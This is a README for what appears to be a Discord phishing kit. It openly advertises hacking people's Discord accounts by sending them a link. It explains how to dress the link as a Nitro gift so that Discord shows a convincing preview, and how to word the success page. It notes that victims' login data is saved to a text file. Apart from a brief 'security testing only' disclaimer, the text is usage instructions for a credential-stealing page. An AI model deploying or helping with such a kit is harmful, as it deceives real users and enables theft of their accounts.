# discord-link-phishing
<h1>I AM NOT RESPONSIBLE FOR ANY CONSEQUENCES</h1>
<h1>FOR SECURITY TESTING PURPOSES ONLY</h1>
hack people's discord with sending them a link!<br/><br/>
Note: you can set anything in the file "submited.php".   I recommend you to change the content of it to "Your Nitro Will Be Activated Soon!"
<br/><br/>
If you want te send the link with embeds send it like this: www.yourdomain.com/gift/HJ9fh9hGfgfijh93<br/>
if the embeds didn't load, add a "/" to the link<br/>
if still is not loading up: add index.html<br/>
if still is not loading up add another / to the link<br/>
if STILL IS NOT LOADING UP: I really don't know.<br/><br/>
tip1: login data will be saved in,   "savedata.txt"<br/>
tip2: set your default web page to "index.php". if you can't add "/index.php" after the "/login" in url. (this will not show nitro banner on discord, I think)
